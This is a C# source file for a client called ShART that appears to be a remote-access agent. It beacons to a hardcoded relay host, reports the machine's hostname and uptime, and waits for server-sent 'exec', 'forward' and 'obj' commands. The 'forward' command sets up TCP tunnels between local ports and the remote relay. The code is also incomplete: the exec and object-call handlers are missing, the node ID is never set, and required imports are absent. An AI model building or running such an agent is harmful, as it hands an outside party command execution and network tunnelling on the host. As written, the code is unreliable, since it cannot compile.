using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Security.Cryptography;
using Newtonsoft.Json;
using System.Collections.Generic;

namespace ShART
{
    public class Program
    {
        public static void Main(string[] args)
        {
            var app = new RelayClient();
            app.Start();
            Console.ReadLine();
        }
    }

    public class RelayClient()
    {
        //Constants
        public const int BufferSize = 81920;
        private const string ServerAddress = "relay.amretar.com";
        private const int HttpPort = 6742;
        private const int TcpPort = 6741;
        private TcpClient client;
        private NetworkStream stream;
        private string nodeId;
        private string hash;
        private string TlsHostKey;
        private string TlsClientKey;
        private CancellationTokenSource cts = new CancellationTokenSource();
        private static readonly Random rng = new Random();
        private static readonly Stopwatch uptimeWatch = Stopwatch.StartNew();

        //Main methods
        public async void Start()
        {
            await ConnectAndRun();
        }

        private async Task ConnectAndRun()
        {
            while (!cts.Token.IsCancellationRequested)
            {
                try
                {
                    // 1. HTTP upgrade
                    var tcpPort = await UpgradeConnection();

                    // 2. Connect to TCP relay
                    client = new TcpClient();
                    await client.ConnectAsync(ServerAddress, tcpPort);
                    stream = client.GetStream();
                    Console.WriteLine("Connected via TCP");

                    // 3. Register node
                    var regMsg = new { node_id = nodeId, hash = hash };
                    await SendJson(regMsg);

                    // 4. Start listening loop
                    _ = Task.Run(ListenLoop, cts.Token);

                    // 5. Start health updates
                    _ = Task.Run(SendHealthLoop, cts.Token);

                    break; // connected successfully
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Connection error: {e.Message}, retrying...");
                    await Task.Delay(5000);
                }
            }
        }

        //Helpers
        private string GenerateHash(string input)
        {
            using (var sha = SHA256.Create())
            {
                var bytes = Encoding.UTF8.GetBytes(input + rng.Next(0, 1_000_000));
                var hashBytes = sha.ComputeHash(bytes);
                return BitConverter.ToString(hashBytes).Replace("-", "").ToLowerInvariant();
            }
        }

        private async Task<int> UpgradeConnection()
        {
            using (var sock = new TcpClient())
            {
                await sock.ConnectAsync(ServerAddress, HttpPort);
                using (var stream = sock.GetStream())
                {
                    string request = $"GET /upgrade HTTP/1.1\r\nHost: {ServerAddress}\r\n\r\n";
                    byte[] reqBytes = Encoding.ASCII.GetBytes(request);
                    await stream.WriteAsync(reqBytes, 0, reqBytes.Length);

                    byte[] buffer = new byte[1024];
                    int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                    string response = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                    if (response.Contains("101 Switching Protocols"))
                    {
                        foreach (var line in response.Split('\n'))
                        {
                            if (line.StartsWith("Upgrade-Port:"))
                            {
                                string portStr = line.Split(':')[1].Trim();
                                if (int.TryParse(portStr, out int port))
                                {
                                    Console.WriteLine($"Upgraded to port {port}");
                                    return port;
                                }
                            }
                        }
                    }

                    throw new Exception("Failed to upgrade connection");
                }
            }
        }

        private async Task SendJson(object obj)
        {
            try
            {
                if (stream == null) return;
                string json = JsonConvert.SerializeObject(obj) + "\n";
                byte[] data = Encoding.UTF8.GetBytes(json);
                await stream.WriteAsync(data, 0, data.Length);
                await stream.FlushAsync();
            }
            catch (Exception e)
            {
                Console.WriteLine($"SendJson error: {e.Message}");
            }
        }

        private async Task ListenLoop()
        {
            using (var reader = new StreamReader(stream, Encoding.UTF8))
            {
                while (!cts.Token.IsCancellationRequested)
                {
                    try
                    {
                        string line = await reader.ReadLineAsync();
                        if (string.IsNullOrWhiteSpace(line)) continue;

                        var msg = JsonConvert.DeserializeObject<Dictionary<string, object>>(line);
                        msg.TryGetValue("action", out object actionObj);
                        msg.TryGetValue("type", out object typeObj);
                        string action = (actionObj ?? typeObj)?.ToString();

                        switch (action)
                        {
                            case "exec":
                                Console.WriteLine($"Exec command received: {msg}");
                                await HandleExec(msg);
                                break;

                            case "forward":
                                Console.WriteLine($"Forward command received: {msg}");
                                await HandleForward(msg);
                                break;
                            case "obj":
                                Console.WriteLine($"Calling Object: {msg}");
                                await CallMethod(msg);
                                break;

                            default:
                                Console.WriteLine($"Unknown message: {line}");
                                break;
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"Listen error: {e.Message}");
                        await Task.Delay(1000);
                    }
                }
            }
        }
        private async Task HandleForward(Dictionary<string, object> msg)
        {
            try
            {
                if (!msg.TryGetValue("direction", out object directionObj) ||
                    !msg.TryGetValue("local_port", out object localPortObj) ||
                    !msg.TryGetValue("remote_port", out object remotePortObj))
                {
                    Console.WriteLine("Forward command missing required fields.");
                    return;
                }

                string direction = directionObj.ToString();
                int localPort = Convert.ToInt32(localPortObj);
                int remotePort = Convert.ToInt32(remotePortObj);

                if (direction == "l")
                {
                    // LOCAL: Accept incoming connections on localPort and forward to remotePort via relay
                    _ = Task.Run(() => StartLocalForward(localPort, remotePort), cts.Token);
                }
                else if (direction == "r")
                {
                    // REMOTE: Connect out to relay remotePort, then forward to local service
                    _ = Task.Run(() => StartRemoteForward(localPort, remotePort), cts.Token);
                }

                Console.WriteLine($"Forward setup ({direction}) local={localPort}, remote={remotePort}");
                await SendJson(new { node_id = nodeId, status = "forward_ok", localPort, remotePort });
            }
            catch (Exception e)
            {
                await SendJson(new { node_id = nodeId, status = "forward_error", error = e.Message });
            }
        }

        private async Task StartLocalForward(int localPort, int remotePort)
        {
            try
            {
                TcpListener listener = new TcpListener(System.Net.IPAddress.Loopback, localPort);
                listener.Start();
                Console.WriteLine($"Local forward listening on {localPort}");

                while (!cts.Token.IsCancellationRequested)
                {
                    var localClient = await listener.AcceptTcpClientAsync();
                    _ = Task.Run(() => HandleLocalConnection(localClient, remotePort), cts.Token);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Local forward error: {e.Message}");
            }
        }

        private async Task HandleLocalConnection(TcpClient localClient, int remotePort)
        {
            try
            {
                using (localClient)
                using (var remoteClient = new TcpClient())
                {
                    await remoteClient.ConnectAsync(ServerAddress, remotePort);
                    Console.WriteLine($"Connected remote port {remotePort}");

                    var localStream = localClient.GetStream();
                    var remoteStream = remoteClient.GetStream();

                    // Forward both directions
                    _ = localStream.CopyToAsync(remoteStream, BufferSize, cts.Token);
                    await remoteStream.CopyToAsync(localStream, BufferSize, cts.Token);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Connection forward error: {e.Message}");
            }
        }

        private async Task StartRemoteForward(int localPort, int remotePort)
        {
            try
            {
                using (var localClient = new TcpClient())
                {
                    await localClient.ConnectAsync("127.0.0.1", localPort);
                    using (var remoteClient = new TcpClient())
                    {
                        await remoteClient.ConnectAsync(ServerAddress, remotePort);
                        Console.WriteLine($"Remote forward connected {localPort} -> {remotePort}");

                        var localStream = localClient.GetStream();
                        var remoteStream = remoteClient.GetStream();

                        _ = localStream.CopyToAsync(remoteStream, BufferSize, cts.Token);
                        await remoteStream.CopyToAsync(localStream, BufferSize, cts.Token);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Remote forward error: {e.Message}");
            }
        }

        private async Task SendHealthLoop()
        {
            while (!cts.Token.IsCancellationRequested)
            {
                try
                {
                    var ram = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes / (1024 * 1024);
                    var health = new
                    {
                        node_id = nodeId,
                        hostname = Environment.MachineName,
                        status = "healthy",
                        uptime = uptimeWatch.Elapsed.TotalSeconds,
                        RAM_usage = $"{ram} MB",
                        CPU_usage = Environment.ProcessorCount + " cores"
                    };

                    await SendJson(health);
                    await Task.Delay(5000, cts.Token);
                }
                catch (TaskCanceledException)
                {
                    break;
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Health loop error: {e.Message}");
                    await Task.Delay(5000);
                }
            }
        }
    }
}